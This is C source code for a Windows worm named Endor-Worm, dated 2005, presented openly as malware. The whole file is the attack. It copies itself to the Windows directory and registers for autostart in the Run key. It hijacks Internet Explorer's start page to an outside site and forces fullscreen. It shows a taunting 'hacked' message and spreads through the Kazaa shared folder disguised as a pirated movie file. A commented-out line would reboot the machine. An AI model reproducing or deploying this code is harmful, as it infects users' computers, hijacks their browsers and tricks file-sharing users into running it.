   /*================================================================
      Endor-Worm by Bobfan
      Version 1.1 30/05/05
   ==================================================================*/

   // Include headers
   #include <windows.h>
   #include <string.h>
   #include <fstream>

   // Define the new Registry Values

   unsigned char reg[40] = "http://www.stringtangafun.de/index.php"; // New Start-URL of IE

   unsigned char reg1[4] = "yes"; // Fullscreen IE

   // unsigned char reg2[10] = ""; // Not Used

   // Define windir
   char windir[MAX_PATH];

   // Begin of Main-Code
   int APIENTRY WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
   {
    // Get the Windows Directory and Registry
    char pathname[256];
    GetWindowsDirectory(windir, sizeof(windir));
    HMODULE hMe = GetModuleHandle(NULL);
    DWORD nRet = GetModuleFileName(hMe, pathname, 256);
    HKEY hKey;

    // Copy the worm to c:\windows\win.exe
    strcat(windir, "\\win.exe");
    CopyFile(pathname, windir, 0);

    // Register Endor in the Registry
    RegCreateKey (HKEY_CURRENT_USER, "Software\\Bobfan", &hKey);
    RegSetValueEx (hKey, "Endor", 0, REG_SZ, (LPBYTE) windir, sizeof(windir));

    // Change Start Page of the Internet Explorer
    RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main",&hKey);
    RegSetValueEx (hKey,"Start Page", 0, REG_SZ, reg, sizeof(reg));
    RegCloseKey(hKey);

    // Change Internet Explorer to Fullscreen
    RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\Main",&hKey);
    RegSetValueEx (hKey,"FullScreen", 0, REG_SZ, reg1, sizeof(reg1));
    RegCloseKey(hKey);

    // Not Used Registry Hack
    // RegCreateKey (HKEY_CURRENT_USER, "Not used",&hKey);
    // RegSetValueEx (hKey,"Nothing", 0, REG_SZ, reg2, sizeof(reg2));
    // RegCloseKey(hKey);

    //Show a Message-Box
    MessageBox (0, "This Computer has been hacked by SKF... Man, you shouldn't trust every program you run!\nThank you for your support you dumbass n00b!\n\nKnowledge is power, but not everybody has the power!", "Endor 1.1", MB_ICONEXCLAMATION | MB_OK);

    // Autostart Endor
    RegCreateKey (HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey);
    RegSetValueEx (hKey, "Endor", 0, REG_SZ, (LPBYTE)windir, sizeof(windir));

    // Copy the worm to Kazaa's Shared Folder to spread on the Network
    CopyFile(pathname, "C:\\My Shared Folder\\starwars-episode3_full_ripped_by_antrax.avi.exe", 0);

    // Reboot the Computer (Remove the // before the next line to enable it)
    // InitiateSystemShutdown(0, 0, 0, TRUE, FALSE);

    return 0; // Exit the Application
   }
